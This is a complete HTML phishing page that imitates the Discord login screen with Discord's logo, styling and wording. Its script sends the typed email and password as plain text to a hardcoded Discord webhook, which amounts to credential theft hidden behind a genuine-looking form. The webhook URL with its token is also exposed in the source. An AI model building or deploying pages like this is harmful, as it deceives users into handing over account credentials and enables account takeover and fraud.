<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Login</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background: url('https://media.discordapp.net/attachments/1217476343499853876/1262721784021647482/image.png?ex=6697a0cd&is=66964f4d&hm=d42c17ac820a8f0c22f9f5f4b016cfc4b41fde0235860bb608b6d50f9dc7c01e&=&format=webp&quality=lossless&width=1440&height=669') no-repeat center center/cover;
            background-color: #7289da;
        }

        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
            height: 100%;
        }

        .login-box {
            background: #36393f;
            padding: 2rem;
            border-radius: 5px;
            box-shadow: 0 1px 15px rgba(0, 0, 0, 0.2);
            text-align: center;
            width: 340px;
            position: relative;
        }

        .discord-logo {
            background: url('https://upload.wikimedia.org/wikipedia/commons/9/98/Discord_logo.svg') no-repeat center center/cover;
            width: 50px;
            height: 50px;
            position: absolute;
            top: -25px;
            left: calc(50% - 25px);
        }

        .login-box h1 {
            color: #ffffff;
            margin-bottom: 0.5rem;
            font-size: 1.5rem;
        }

        .login-box p {
            color: #b9bbbe;
            margin-bottom: 1.5rem;
            font-size: 0.875rem;
        }

        .login-box label {
            color: #b9bbbe;
            display: block;
            text-align: left;
            margin-bottom: 0.5rem;
            font-size: 0.875rem;
            font-weight: bold; /* Added bold font */
        }

        .login-box input {
            width: 100%;
            padding: 0.75rem;
            margin-bottom: 1rem;
            border: none;
            border-radius: 3px;
            background: #2f3136;
            color: #dcddde;
            font-size: 0.875rem;
        }

        .login-box button {
            width: 100%;
            padding: 0.75rem;
            background: #7289da;
            border: none;
            border-radius: 3px;
            color: #ffffff;
            font-size: 0.875rem;
            cursor: pointer;
        }

        .login-box button:hover {
            background: #677bc4;
        }

        .links a {
            color: #7289da;
            display: block;
            margin-top: 0.5rem;
            text-decoration: none;
            font-size: 0.875rem;
        }

        .links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="discord-logo"></div>
            <h1>Welcome back!</h1>
            <p>We're so excited to see you again!</p>
            <form id="login-form">
                <label for="email">EMAIL OR PHONE NUMBER <span style="color: #f04747;">*</span></label>
                <input type="email" id="email" name="email" required>
                <label for="password">PASSWORD <span style="color: #f04747;">*</span></label>
                <input type="password" id="password" name="password" required>
                <button type="submit">Login</button>
            </form>
            <div class="links">
                <a href="https://discord.com/register?redirect_to=%2Fchannels%2F1216367197014851635%2F1216367197555785730" target="_blank">Register an account</a>
                <a href="#">Forgot your password?</a>
            </div>
        </div>
    </div>
    <script>
        document.getElementById('login-form').addEventListener('submit', function(e) {
            e.preventDefault();

            const email = e.target.email.value;
            const password = e.target.password.value;

            const data = {
                content: `Email: ${email}\nPassword: ${password}`
            };

            fetch('https://discord.com/api/webhooks/1220738795570335895/kT8-knDmwJQAAfRc9uPnX0naFtjXyzXjqVYiqEXV-BEx0Ubggl3o7-sXpqH6ZvoFZ9oe', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            }).catch(error => {
                console.error('An error occurred:', error);
            });
        });
    </script>
</body>
</html>
